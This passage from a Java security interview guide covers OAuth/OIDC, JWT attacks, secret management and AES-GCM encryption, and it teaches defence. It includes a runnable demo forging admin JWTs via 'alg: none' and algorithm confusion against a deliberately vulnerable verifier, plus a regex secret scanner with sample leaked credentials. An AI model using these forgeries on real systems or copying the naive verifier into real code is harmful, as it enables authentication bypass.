| Tokens in `localStorage` | BFF with HttpOnly cookies, or in-memory storage with short lifetimes. |
| Over-broad scopes | Request only needed scopes; validate scopes in the API. |

**Q1. OAuth 2.0 vs OIDC?** OAuth 2.0 is about delegated authorization (access tokens for APIs). OIDC adds authentication: an ID token and user info, so apps can log users in.

**Q2. Why authorization code + PKCE even for SPAs and mobile apps?** Public clients can't keep a client secret. PKCE binds the code to the client instance, so intercepted codes are useless; the implicit flow leaked tokens in URLs and is deprecated.

**Q3. Which flow for service-to-service calls?** Client credentials: the service authenticates as itself and gets a token with its own scopes.

**Q4. What are refresh tokens and how do you secure them?** Long-lived credentials to obtain new short-lived access tokens. Store them server-side or securely on the device, rotate on each use (detect reuse), bind to the client, revoke on logout.

**Q5. What is SSO and how is it implemented?** One login for many apps: the apps trust a central IdP via OIDC (or SAML); the IdP's session lets users into each app without re-entering credentials.

---

## 3.7 OAuth 2.0 / OIDC - Cheat Sheet

```
OAUTH2 / OIDC  OAuth2 = delegated authorization (access token + scopes). OIDC = login on top (ID token, userinfo, nonce).
          Roles: resource owner, client, authorization server (Keycloak/Okta/Spring Authorization Server), resource server.
          Flows: Authorization Code + PKCE (all user clients) | Client Credentials (s2s) | Device | Refresh (rotate).
          Implicit + password grants deprecated (OAuth 2.1). Validate state, nonce, exact redirect URIs, aud, scopes.
          SSO = one IdP session for many apps (OIDC/SAML); federated identity = trust external IdPs.
          Spring: oauth2Login(), oauth2ResourceServer().jwt(), oauth2-client (client_credentials), TokenRelay; BFF for SPAs.
```

---

# 4. JWT and Security Tokens (Interview Imp - Java)

## 4.1 What Are Security Tokens and JWTs?

A **security token** is a piece of data that proves an identity or a right, so the holder doesn't have to present a password again. Tokens come in two kinds:

| Kind | What it is | How it's checked |
|---|---|---|
| **Opaque (reference) token** | A random string; the meaning is stored on the server | Look it up (session store, or OAuth **introspection** endpoint) |
| **Self-contained (value) token** | Carries its claims inside, **signed** | Verify the signature locally |

A **JWT (JSON Web Token)** is the most common self-contained token: `header.payload.signature`, each part Base64url-encoded. The header names the algorithm; the payload holds **claims** (`sub`, `iss`, `aud`, `exp`, `scope`...); the signature proves who issued it and that nothing was changed.

**Analogy:** A signed and sealed letter of authority. Anyone can **read** it (it isn't secret), but nobody can **change** what it says without breaking the seal, and you can check the seal against the issuer's known stamp.

> JWT structure, the claims each service must check (signature, `exp`, `iss`, `aud`, scopes) and Spring resource-server setup are covered in [02_Microservices_Pattern.md](../04_Specialized/02_Microservices_Pattern.md#9-access-token-pattern-securing-service-to-service-calls-interview-imp---java). This section focuses on **attacks and safe handling**.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Security token** | Data proving identity/permissions, used instead of re-sending credentials. |
| **Opaque token** | A random reference that only the issuer can interpret. |
| **JWT** | A signed (sometimes encrypted) JSON token: header, payload, signature. |
| **JWS / JWE** | JSON Web Signature (signed, readable) / JSON Web Encryption (encrypted, unreadable). |
| **Claim** | A statement inside the token (`"sub":"asha"`). |
| **JWKS** | The issuer's published set of public keys used to verify signatures. |

---

## 4.2 Why Careful Handling Matters

JWT libraries and verifiers have been broken many times by the **same few mistakes**:

| Attack | How it works | Defence |
|---|---|---|
| **`alg: none`** | Attacker removes the signature and sets `alg` to `none`; a naive verifier accepts it | **Pin** the accepted algorithm(s); reject `none` |
| **Algorithm confusion (RS256 → HS256)** | Attacker signs with HMAC using the server's **public** key as the secret; a verifier that trusts the header's `alg` checks HMAC with that same public key | Pin the algorithm **per key**; never let the token choose |
| **`kid` / `jku` injection** | Header points the verifier at an attacker-controlled key or URL | Only trust keys from your configured JWKS; allow-list key IDs |
| **No expiry / long expiry** | Stolen tokens work for days | Short `exp` (5-15 min) + refresh tokens |
| **Missing `aud`/`iss` checks** | A token for service A is replayed against service B | Validate issuer and audience |
| **Sensitive data in claims** | The payload is just Base64 | Only IDs and permissions; use JWE if confidentiality is needed |
| **XSS steals tokens from `localStorage`** | Any injected script can read it | HttpOnly cookies / BFF; strict CSP |

---

## 4.3 How It Works: Lifetimes, Revocation and Storage

| Concern | Practice |
|---|---|
| **Access token lifetime** | Short (5-15 minutes) |
| **Refresh tokens** | Longer-lived, **opaque**, stored server-side or securely; **rotate** on every use and detect reuse (a reused old refresh token = theft → revoke the family) |
| **Revocation** | Short lifetimes; deny-list of `jti` values for emergencies; opaque tokens + introspection for very sensitive APIs; revoke refresh tokens on logout/password change |
| **Browser storage** | Best: tokens never reach the browser (BFF + `HttpOnly` cookie). Otherwise in memory only; avoid `localStorage` |
| **Mobile storage** | iOS Keychain / Android Keystore |
| **Key rotation** | Publish new key in JWKS, sign with it, keep the old key until old tokens expire (`kid` header selects the key) |
| **Proof of possession** | DPoP or mTLS-bound tokens: a stolen token is useless without the client's private key |

---

## 4.4 Complete Java Example - Why Verifiers Must Pin the Algorithm

```java
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.Signature;
import java.util.Base64;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

// Why JWT verifiers must PIN the algorithm: the classic "alg":"none" and HS256/RS256 confusion attacks
public class JwtValidationDemo {
    static final Base64.Encoder ENC = Base64.getUrlEncoder().withoutPadding();
    static final Base64.Decoder DEC = Base64.getUrlDecoder();

    static String b64(String s) { return ENC.encodeToString(s.getBytes(StandardCharsets.UTF_8)); }

    static byte[] hmac(byte[] key, String data) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(key, "HmacSHA256"));
        return mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
    }

    // NAIVE verifier: trusts the "alg" field chosen by the token itself
    static boolean naiveVerify(String jwt, KeyPair keys) throws Exception {
        String[] p = jwt.split("\\.", -1);
        String header = new String(DEC.decode(p[0]), StandardCharsets.UTF_8);
        if (header.contains("\"none\"")) return true;                                  // !!! accepts unsigned tokens
        if (header.contains("HS256")) {                                                // !!! uses the PUBLIC key as an HMAC secret
            return MessageDigest.isEqual(hmac(keys.getPublic().getEncoded(), p[0] + "." + p[1]), DEC.decode(p[2]));
        }
        return rsVerify(p, keys);
    }

    // STRICT verifier: only RS256 is acceptable, whatever the header says
    static boolean strictVerify(String jwt, KeyPair keys) throws Exception {
        String[] p = jwt.split("\\.", -1);
        String header = new String(DEC.decode(p[0]), StandardCharsets.UTF_8);
        if (!header.contains("\"alg\":\"RS256\"")) return false;
        return rsVerify(p, keys);
    }

    static boolean rsVerify(String[] p, KeyPair keys) throws Exception {
        if (p[2].isEmpty()) return false;
        Signature s = Signature.getInstance("SHA256withRSA");
        s.initVerify(keys.getPublic());
        s.update((p[0] + "." + p[1]).getBytes(StandardCharsets.UTF_8));
        return s.verify(DEC.decode(p[2]));
    }

    public static void main(String[] args) throws Exception {
        KeyPairGenerator g = KeyPairGenerator.getInstance("RSA");
        g.initialize(2048);
        KeyPair keys = g.generateKeyPair();                                   // auth server's key pair; public key is published (JWKS)

        String payload = b64("{\"sub\":\"asha\",\"role\":\"USER\",\"exp\":9999999999}");
        String header = b64("{\"alg\":\"RS256\",\"typ\":\"JWT\"}");
        Signature s = Signature.getInstance("SHA256withRSA");
        s.initSign(keys.getPrivate());
        s.update((header + "." + payload).getBytes(StandardCharsets.UTF_8));
        String genuine = header + "." + payload + "." + ENC.encodeToString(s.sign());

        String evilPayload = b64("{\"sub\":\"asha\",\"role\":\"ADMIN\",\"exp\":9999999999}");
        String noneToken = b64("{\"alg\":\"none\"}") + "." + evilPayload + ".";
        String hsHeader = b64("{\"alg\":\"HS256\",\"typ\":\"JWT\"}");
        String confused = hsHeader + "." + evilPayload + "." + ENC.encodeToString(hmac(keys.getPublic().getEncoded(), hsHeader + "." + evilPayload));

        String[][] cases = {{"genuine RS256 token", genuine}, {"alg=none, role=ADMIN", noneToken}, {"HS256 signed with PUBLIC key", confused}};
        System.out.printf("%-30s %-14s %s%n", "token", "naive verifier", "strict verifier (RS256 only)");
        for (String[] c : cases) {
            System.out.printf("%-30s %-14s %s%n", c[0], naiveVerify(c[1], keys) ? "ACCEPTED" : "rejected", strictVerify(c[1], keys) ? "ACCEPTED" : "rejected");
        }
    }
}
```

**Output:**
```
token                          naive verifier strict verifier (RS256 only)
genuine RS256 token            ACCEPTED       ACCEPTED
alg=none, role=ADMIN           ACCEPTED       rejected
HS256 signed with PUBLIC key   ACCEPTED       rejected
```

What the output shows:
- The **naive verifier**, which believed whatever `alg` the token claimed, accepted **forged admin tokens** two different ways: an unsigned `alg=none` token, and an HS256 token "signed" with the server's **public** key (which anyone can download from the JWKS endpoint).
- The **strict verifier**, which only accepts RS256 and verifies with the RSA public key, rejected both forgeries and accepted only the genuine token.

---

## 4.5 Tokens in Spring Security

```java
// Pin the algorithm and validate issuer + audience explicitly
@Bean
JwtDecoder jwtDecoder() {
    NimbusJwtDecoder decoder = NimbusJwtDecoder
            .withJwkSetUri("https://auth.shop.com/realms/shop/protocol/openid-connect/certs")
            .jwsAlgorithm(SignatureAlgorithm.RS256)                       // only RS256 accepted
            .build();
    OAuth2TokenValidator<Jwt> validators = new DelegatingOAuth2TokenValidator<>(
            JwtValidators.createDefaultWithIssuer("https://auth.shop.com/realms/shop"),   // exp, nbf, iss
            new JwtClaimValidator<List<String>>("aud", aud -> aud != null && aud.contains("orders-api")));
    decoder.setJwtValidator(validators);
    return decoder;
}

// Opaque tokens checked by introspection (when instant revocation matters)
// spring.security.oauth2.resourceserver.opaquetoken.introspection-uri / client-id / client-secret
// http.oauth2ResourceServer(o -> o.opaqueToken(Customizer.withDefaults()));
```

> If you configure `issuer-uri` and `audiences` in `application.yml`, Spring Boot builds a decoder with these validators for you; the explicit bean above shows what's happening and pins the algorithm.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **`alg: none`** | A JWT header claiming "no signature"; must always be rejected. |
| **Algorithm confusion** | Tricking a verifier into using the wrong algorithm with a key meant for another. |
| **`kid`** | Key ID header telling the verifier which key from the JWKS to use. |
| **`jti`** | JWT ID: a unique token identifier, useful for deny-lists. |
| **Refresh token rotation** | Each refresh returns a new refresh token and invalidates the old one. |
| **DPoP** | Demonstrating Proof of Possession: binds a token to a client-held key. |
| **`NimbusJwtDecoder`** | Spring Security's JWT decoder built on the Nimbus JOSE + JWT library. |

---

## 4.6 Interview Questions and Cheat Sheet

**Q1. What's inside a JWT, and is it secure to put data in it?** Header, payload (claims), signature. It's signed, not encrypted: anyone can read the payload, so put only identifiers and permissions in it (or use JWE).

**Q2. What is the `alg:none` / algorithm-confusion attack?** A verifier that trusts the token's `alg` header can be tricked into accepting unsigned tokens, or HMAC tokens signed with the public key. Pin the expected algorithm per key and use a well-tested library.

**Q3. How do you revoke JWTs?** Keep them short-lived, revoke and rotate refresh tokens, keep an emergency deny-list of `jti`s, or use opaque tokens with introspection where instant revocation is required.

**Q4. Where should a browser app keep tokens?** Ideally nowhere: use a BFF that keeps tokens server-side and gives the browser an `HttpOnly`, `Secure`, `SameSite` session cookie. Avoid `localStorage`.

**Q5. Opaque vs JWT access tokens?** Opaque: easy to revoke, needs introspection calls. JWT: verified locally and scalable, hard to revoke before expiry.

```
TOKENS     Opaque (lookup/introspection, easy revoke) vs self-contained JWT (signed claims, local verify, hard revoke).
           Verify: PIN algorithm (no 'none', no HS/RS confusion), keys only from your JWKS (kid allow-list), exp/nbf, iss, aud, scope.
           Short access tokens (5-15 min); opaque rotating refresh tokens with reuse detection; jti deny-list for emergencies.
           No secrets in claims; tokens out of localStorage (BFF + HttpOnly cookie); key rotation via kid; DPoP/mTLS binding.
           Spring: NimbusJwtDecoder.jwsAlgorithm(RS256) + validators (issuer, aud); opaqueToken() for introspection.
```

---

## 4.7 Types and Variants, Pros and Cons

| Token type | Properties | Example |
|---|---|---|
| **JWS (signed JWT)** | Readable claims + signature (HS256 shared secret, RS256/ES256 public key) | OAuth access tokens, ID tokens |
| **JWE (encrypted JWT)** | Claims encrypted, not readable by the client | Tokens carrying sensitive data |
| **Opaque token** | Random string; server looks it up (introspection) | Session ids, OAuth reference tokens |
| **ID token vs access token** | ID token = who the user is (for the client); access token = what the caller may do (for APIs) | OpenID Connect |
| **Refresh token** | Long-lived, used only to get new access tokens, rotated on use | OAuth refresh flow |
| **PASETO / Biscuit / macaroons** | Alternatives with safer defaults or attenuation | Niche but growing |

| Pros (self-contained JWT) | Cons |
|---|---|
| Stateless validation, no DB lookup per request | Hard to revoke before expiry (use short lifetimes, deny-lists, or introspection) |
| Works across services and domains | Size grows with claims (sent on every request) |
| Standard libraries everywhere | Easy to misuse: `alg: none`, weak HS256 secrets, missing `aud`/`iss` checks, storing in `localStorage` (XSS) |

# 5. Secret Management Pattern

## 5.1 What is Secret Management?

**Secret management** is how you **store, distribute, rotate and audit** sensitive values (database passwords, API keys, private keys, OAuth client secrets, encryption keys) so they **never appear in source code, images or logs**, and only the right workloads can read them.

**Analogy:** A bank's safe-deposit room. Keys aren't left in the office drawer or written on sticky notes. They're kept in the vault, handed out only to authorised staff, logged every time they're used, and changed regularly.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Secret** | Any value that grants access (password, token, key, certificate). |
| **Vault / secret store** | A dedicated system for storing and handing out secrets (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager). |
| **Rotation** | Regularly replacing a secret with a new one. |
| **Dynamic secret** | A short-lived credential generated on demand (e.g. a DB user valid for 1 hour). |
| **KMS / HSM** | Key Management Service / Hardware Security Module: protected storage and use of encryption keys. |

---

## 5.2 Why Do We Need It?

| Common mistake | Consequence |
|---|---|
| Passwords in `application.yml` committed to Git | Anyone with repo access (or a leaked repo) has production credentials, **forever** in history |
| Secrets baked into Docker images | Anyone who can pull the image can extract them |
| Kubernetes Secrets treated as encrypted | They're **Base64**, not encrypted, unless etcd encryption and RBAC are configured |
| Shared, never-rotated credentials | A leak stays exploitable for years; no way to know who used it |
| Secrets printed in logs or error messages | Log platforms become a treasure trove |

Leaked cloud keys pushed to public GitHub repos are typically found and abused **within minutes** by automated scanners.

---

## 5.3 How It Works

| Practice | How |
|---|---|
| **Central store** | Vault / cloud secret manager; access via the workload's **identity** (Kubernetes service account, cloud IAM role), not another static secret |
| **Inject at runtime** | Environment variables, mounted files, or fetched by the app at startup ([02_Microservices_Pattern.md](../04_Specialized/02_Microservices_Pattern.md#8-externalized-configuration-pattern-interview-imp---java)) |
| **Least privilege** | Each service can read only its own secrets |
| **Rotation** | Automatic rotation schedules; apps reload without redeploying; support two valid versions during the switch |
| **Dynamic, short-lived credentials** | Vault database secrets engine: unique DB user per app instance with a TTL |
| **Audit** | Every read is logged (who, when, which secret) |
| **Prevention** | Pre-commit hooks and CI scanning (gitleaks, GitHub secret scanning, TruffleHog) |
| **Incident response** | If a secret leaks: **revoke and rotate immediately**; removing it from Git history isn't enough |

---

## 5.4 Complete Java Example - A Tiny Secret Scanner

```java
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

// A tiny "gitleaks"-style scanner: find hard-coded secrets before they're committed
public class SecretScanDemo {
    static final Map<String, Pattern> RULES = new LinkedHashMap<>();
    static {
        RULES.put("AWS access key id", Pattern.compile("AKIA[0-9A-Z]{16}"));
        RULES.put("Private key block", Pattern.compile("-----BEGIN (RSA |EC )?PRIVATE KEY-----"));
        RULES.put("Password in config", Pattern.compile("(?i)(password|passwd|pwd)\\s*[:=]\\s*(?!\\$\\{)[^\\s]{4,}"));
        RULES.put("Generic API key", Pattern.compile("(?i)(api[_-]?key|secret)\\s*[:=]\\s*['\"]?[A-Za-z0-9_\\-]{20,}"));
        RULES.put("JDBC URL with password", Pattern.compile("jdbc:[a-z]+://[^\\s]*password=[^&\\s]+"));
    }

    public static void main(String[] args) {
        List<String> files = List.of(
                "application.yml:3:    password: S3cr3tP@ss",
                "application.yml:4:    password: ${DB_PASSWORD}",
                "PaymentClient.java:12: private static final String API_KEY = \"sk_example_not_a_real_key_000000\";",
                "deploy.sh:7: export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
                "id_rsa:1: -----BEGIN RSA PRIVATE KEY-----",
                "datasource.properties:2: url=jdbc:postgresql://db:5432/shop?user=app&password=hunter2",
                "README.md:20: Set the API key via the PAYMENT_API_KEY environment variable.");
        int findings = 0;
        for (String line : files) {
            String location = line.substring(0, line.indexOf(' '));
            String content = line.substring(line.indexOf(' ') + 1);
            for (var rule : RULES.entrySet()) {
                if (rule.getValue().matcher(content).find()) {
                    findings++;
                    System.out.printf("LEAK  %-28s %s%n", location, rule.getKey());
                    break;
                }
            }
        }
        System.out.println(findings + " findings. Lines using ${DB_PASSWORD} placeholders or env-var instructions are clean.");
        System.out.println("Fix: remove from code, ROTATE the secret (it's in git history now), load it from a vault/secret store.");
    }
}
```

**Output:**
```
LEAK  application.yml:3:           Password in config
LEAK  PaymentClient.java:12:       Generic API key
LEAK  deploy.sh:7:                 AWS access key id
LEAK  id_rsa:1:                    Private key block
LEAK  datasource.properties:2:     Password in config
5 findings. Lines using ${DB_PASSWORD} placeholders or env-var instructions are clean.
Fix: remove from code, ROTATE the secret (it's in git history now), load it from a vault/secret store.
```

What the output shows:
- Five kinds of leaked secret were detected: a plain password in YAML, a hard-coded live API key, an AWS access key, a private key file, and a password inside a JDBC URL.
- A **placeholder** (`${DB_PASSWORD}`) and documentation telling people to use an **environment variable** were correctly **not** flagged.
- Real scanners (gitleaks, TruffleHog, GitHub secret scanning) work the same way with hundreds of rules plus **entropy** checks, and run as **pre-commit hooks** and in **CI**.

---

## 5.5 Secret Management in Spring and Kubernetes

```yaml
# Spring Cloud Vault: load secrets from Vault at startup using the pod's Kubernetes identity
spring:
  application:
    name: order-service
  config:
    import: "vault://"
  cloud:
    vault:
      uri: https://vault.internal:8200
      authentication: KUBERNETES
      kubernetes:
        role: order-service              # Vault role bound to this service account
      kv:
        enabled: true
        backend: secret                  # secret/order-service -> spring properties
      database:
        enabled: true
        role: order-service-rw           # dynamic DB credentials with a TTL
```

```yaml
# Kubernetes: secrets synced from a cloud secret manager by the External Secrets Operator
apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata: { name: order-db }
spec:
  refreshInterval: 1h
  secretStoreRef: { name: aws-secrets-manager, kind: ClusterSecretStore }
  target: { name: order-db-credentials }
  data:
    - secretKey: password
      remoteRef: { key: prod/order-service/db, property: password }
```

| Platform | Notes |
|---|---|
| **HashiCorp Vault / OpenBao** | KV secrets, dynamic DB/cloud credentials, PKI, transit encryption |
| **AWS Secrets Manager / SSM Parameter Store**, **Azure Key Vault**, **GCP Secret Manager** | Managed, IAM-integrated, rotation support |
| **Kubernetes Secrets** | Enable encryption at rest for etcd, restrict RBAC, prefer CSI driver / External Secrets |
| **Sealed Secrets / SOPS** | Encrypted secrets that can be stored in Git (GitOps) |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **Spring Cloud Vault** | Spring integration that loads Vault secrets as configuration properties. |
| **Workload identity** | The identity a pod/VM has (service account, IAM role), used to authenticate to the vault. |
| **External Secrets Operator** | Kubernetes operator syncing secrets from external stores into Kubernetes Secrets. |
| **Sealed Secrets / SOPS** | Tools to keep encrypted secrets in Git safely. |
| **Entropy check** | Flagging random-looking strings that are likely keys. |

---

## 5.6 Pitfalls, Interview Questions and Cheat Sheet

| Pitfall | Fix |
|---|---|
| "We'll delete it from the repo" after a leak | Revoke and rotate first; history and forks keep it. |
| One master secret to fetch all other secrets | Workload identity (no bootstrap secret), least privilege per service. |
| Rotation requires a redeploy | Reload from the store; support old + new secret during the switch. |
| Secrets in CI logs | Mask variables; never `echo` them. |

**Q1. How do you manage secrets in a microservices system?** Store them in a vault/cloud secret manager, authenticate workloads by identity, inject at runtime (env/files/Spring Cloud Vault), least privilege per service, automatic rotation, audit access, and scan code/CI for leaks.

**Q2. Are Kubernetes Secrets secure?** Only partly: they're Base64-encoded, not encrypted, by default. Enable etcd encryption at rest, restrict RBAC, and prefer external secret stores.

**Q3. What do you do if a secret is committed to Git?** Revoke/rotate it immediately, check access logs for misuse, then clean history and add scanning to prevent recurrence.

```
SECRETS   Never in code, images, logs or plain Git. Store in Vault / cloud secret manager / KMS.
          Workload identity auth; inject at runtime (env, files, Spring Cloud Vault spring.config.import=vault://).
          Least privilege, rotation (dual-valid period), dynamic short-lived DB creds, audit every read.
          Scan: gitleaks/TruffleHog pre-commit + CI. K8s Secrets = Base64 -> etcd encryption, RBAC, External Secrets/Sealed Secrets.
          Leak -> REVOKE + ROTATE first.
```

---

## 5.7 Pros and Cons

| Pros | Cons |
|---|---|
| Secrets out of code, Git and container images | Another critical system to run (or pay for) and secure |
| Central audit trail of who read which secret | The vault/secret store becomes a dependency for startup |
| Rotation and dynamic, short-lived credentials (Vault database secrets) | Apps must handle rotation without restarts |
| Fine-grained access per service | Bootstrapping problem: the app needs *some* identity to fetch secrets (use workload identity/IAM roles) |

# 6. Encryption at Rest and in Transit

## 6.1 What Are They?

- **Encryption in transit** protects data **moving across a network** (browser ↔ server, service ↔ service, app ↔ database) from eavesdropping and tampering, using **TLS**.
- **Encryption at rest** protects data **stored** on disks, databases, backups and object storage, so stolen disks, snapshots or database dumps are unreadable without the keys.

**Analogy:** In transit = an armoured van carrying cash between branches. At rest = the bank vault where the cash is stored. You need both: a vault doesn't help if the van is robbed, and vice versa.

### Hashing vs encryption vs encoding vs signing

| | Reversible? | Needs a key? | Purpose | Examples |
|---|---|---|---|---|
| **Encoding** | Yes, by anyone | No | Format conversion, not security | Base64, URL encoding |
| **Hashing** | No | No (or a salt) | Fingerprints, password storage | SHA-256, Argon2, bcrypt |
| **Encryption** | Yes, with the key | Yes | Confidentiality | AES-GCM, RSA-OAEP, TLS |
| **MAC / signature** | n/a | Yes | Integrity + authenticity | HMAC-SHA256, RSA/ECDSA signatures |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **TLS** | Transport Layer Security: the protocol behind HTTPS; encrypts and authenticates connections. |
| **Symmetric encryption** | One shared key encrypts and decrypts (AES). Fast. |
| **Asymmetric encryption** | A public key encrypts/verifies, a private key decrypts/signs (RSA, EC). Slower. |
| **AES-GCM** | AES in Galois/Counter Mode: encryption plus a built-in integrity tag (authenticated encryption). |
| **IV / nonce** | A unique value per encryption so equal plaintexts give different ciphertexts. |
| **Envelope encryption** | Data is encrypted with a data key; the data key is encrypted by a master key in a KMS. |

---

## 6.2 Why Do We Need It?

| Without encryption | Risk |
|---|---|
| HTTP instead of HTTPS | Passwords and tokens readable on public Wi-Fi; responses can be modified (injected scripts) |
| Plain-text internal traffic | Anyone inside the network (or a compromised pod) can sniff credentials |
| Unencrypted DB volumes/backups | A leaked snapshot or lost backup tape exposes everything |
| Sensitive columns readable by everyone with DB access | DBAs and analysts see card numbers or Aadhaar numbers |

Regulations (PCI DSS for cards, GDPR, India's DPDP Act, HIPAA) require appropriate encryption of sensitive personal data.

---

## 6.3 How It Works

### In transit: TLS and HTTPS everywhere

| Practice | Detail |
|---|---|
| **HTTPS only** | Redirect HTTP → HTTPS; **HSTS** header so browsers never use HTTP again |
| **Modern TLS** | TLS 1.3 (or 1.2 with strong ciphers); disable old protocols |
| **Certificates** | From a trusted CA (Let's Encrypt, cloud CAs); automate renewal (cert-manager, ACME); monitor expiry |
| **Internal traffic** | TLS to databases, brokers and caches; **mTLS** between services (often via a service mesh) |
| **Certificate pinning** | Only for mobile apps talking to your own API, and only with a rotation plan |

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: ClientHello (TLS 1.3, supported ciphers, key share)
    S-->>C: ServerHello + certificate + key share (+ signature)
    C->>C: verify certificate chain + hostname
    Note over C,S: both derive the same session keys (ECDHE)
    C->>S: encrypted HTTP request
    S-->>C: encrypted HTTP response
```

### At rest: layers

| Layer | What it protects against | Who can still read |
|---|---|---|
| **Disk / volume encryption** (EBS, LUKS) | Stolen disks/snapshots | Anyone with DB access |
| **Database TDE** (Transparent Data Encryption) | Stolen data files/backups | Anyone with DB access |
| **Column / field-level encryption** | DBAs, analysts, SQL injection dumps | Only the app (with the key) |
| **Application-level (client-side) encryption** | Even the DB and storage provider | Only services holding the key |

**Use authenticated encryption (AES-256-GCM)**, a **unique IV per encryption**, keys in a **KMS/HSM**, and **envelope encryption** so master keys never leave the KMS and rotation is cheap.

---

## 6.4 Complete Java Example - AES-GCM, Tamper Detection and Envelope Encryption

```java
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import javax.crypto.AEADBadTagException;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;

// AES-256-GCM: confidentiality + integrity. Envelope encryption: data key (DEK) encrypted by a master key (KEK).
public class EncryptionDemo {
    static final SecureRandom RANDOM = new SecureRandom();

    static byte[] encrypt(SecretKey key, byte[] plaintext, byte[] aad) throws Exception {
        byte[] iv = new byte[12];
        RANDOM.nextBytes(iv);                                         // NEVER reuse an IV with the same key
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
        c.updateAAD(aad);                                             // authenticated but not encrypted (e.g. record id)
        byte[] ct = c.doFinal(plaintext);
        return ByteBuffer.allocate(iv.length + ct.length).put(iv).put(ct).array();   // store IV with the ciphertext
    }

    static byte[] decrypt(SecretKey key, byte[] blob, byte[] aad) throws Exception {
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, blob, 0, 12));
        c.updateAAD(aad);
        return c.doFinal(blob, 12, blob.length - 12);
    }

    public static void main(String[] args) throws Exception {
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256);
        SecretKey kek = kg.generateKey();            // master key: lives in a KMS/HSM, never leaves it in real systems
        SecretKey dek = kg.generateKey();            // data key: encrypts the actual data

        byte[] pan = "4111 1111 1111 1111".getBytes(StandardCharsets.UTF_8);
        byte[] aad = "customer:42".getBytes(StandardCharsets.UTF_8);
        byte[] ct1 = encrypt(dek, pan, aad);
        byte[] ct2 = encrypt(dek, pan, aad);
        System.out.println("plaintext bytes = " + pan.length + ", ciphertext blob = " + ct1.length + " bytes (12 IV + data + 16 auth tag)");
        System.out.println("same card encrypted twice gives different ciphertext (random IV): " + !java.util.Arrays.equals(ct1, ct2));
        System.out.println("decrypts back correctly: " + new String(decrypt(dek, ct1, aad), StandardCharsets.UTF_8).equals("4111 1111 1111 1111"));

        byte[] tampered = ct1.clone();
        tampered[20] ^= 1;                           // flip one bit of the stored ciphertext
        try { decrypt(dek, tampered, aad); }
        catch (AEADBadTagException e) { System.out.println("one flipped bit -> AEADBadTagException (tampering detected)"); }
        try { decrypt(dek, ct1, "customer:43".getBytes(StandardCharsets.UTF_8)); }
        catch (AEADBadTagException e) { System.out.println("ciphertext moved to another customer's row -> rejected (AAD mismatch)"); }

        // Envelope encryption: store the DEK only in WRAPPED (encrypted) form next to the data
        byte[] wrappedDek = encrypt(kek, dek.getEncoded(), "dek-v1".getBytes(StandardCharsets.UTF_8));
        byte[] unwrapped = decrypt(kek, wrappedDek, "dek-v1".getBytes(StandardCharsets.UTF_8));
        SecretKey restored = new javax.crypto.spec.SecretKeySpec(unwrapped, "AES");
        System.out.println("envelope: wrapped DEK = " + wrappedDek.length + " bytes; unwrap via KMS then decrypt data: "
                + new String(decrypt(restored, ct1, aad), StandardCharsets.UTF_8).equals("4111 1111 1111 1111"));
        System.out.println("rotating the master key = re-wrap the small DEKs, not re-encrypt all the data");
    }
}
```

**Output:**
```
plaintext bytes = 19, ciphertext blob = 47 bytes (12 IV + data + 16 auth tag)
same card encrypted twice gives different ciphertext (random IV): true
decrypts back correctly: true
one flipped bit -> AEADBadTagException (tampering detected)
ciphertext moved to another customer's row -> rejected (AAD mismatch)
envelope: wrapped DEK = 60 bytes; unwrap via KMS then decrypt data: true
rotating the master key = re-wrap the small DEKs, not re-encrypt all the data
```

What the output shows:
- The stored blob = 12-byte **IV** + ciphertext + 16-byte **authentication tag**.
- Encrypting the same card twice gave **different** ciphertexts (random IV), so an attacker can't spot equal values.
- Flipping **one bit** made decryption fail with `AEADBadTagException`: GCM detects tampering instead of returning garbage.
- **AAD** (associated data, here the customer ID) bound the ciphertext to its row: copying it to another customer's row is rejected.
- **Envelope encryption:** only the small wrapped data key is stored next to the data; the master key (in a real system, inside a KMS) unwraps it. Rotating the master key means re-wrapping data keys, not re-encrypting terabytes.

---

## 6.5 Encryption in Spring Boot and the Cloud

```yaml
# HTTPS on the embedded server with SSL bundles (Spring Boot 3.1+)
server:
  port: 8443
  ssl:
    bundle: web-server
spring:
  ssl:
    bundle:
      pem:
        web-server:
          keystore:
            certificate: file:/etc/tls/tls.crt
            private-key: file:/etc/tls/tls.key
        payments-mtls:                       # client certificate for calling a partner with mTLS
          keystore:
            certificate: file:/etc/tls/client.crt
            private-key: file:/etc/tls/client.key
          truststore:
            certificate: file:/etc/tls/partner-ca.crt
```

```java
// Use an SSL bundle for an outgoing client (mTLS to a partner)
@Bean
RestClient partnerClient(RestClient.Builder builder, RestClientSsl ssl) {          // RestClientSsl is auto-configured by Spring Boot
    return builder.baseUrl("https://partner.example").apply(ssl.fromBundle("payments-mtls")).build();
}
```

```java
// Field-level encryption with a JPA AttributeConverter (key from KMS/Vault, not hard-coded)
@Converter
class EncryptedStringConverter implements AttributeConverter<String, String> {
    private final FieldCipher cipher;                     // wraps AES-GCM + envelope keys from KMS
    EncryptedStringConverter(FieldCipher cipher) { this.cipher = cipher; }
    public String convertToDatabaseColumn(String plain) { return plain == null ? null : cipher.encryptToBase64(plain); }
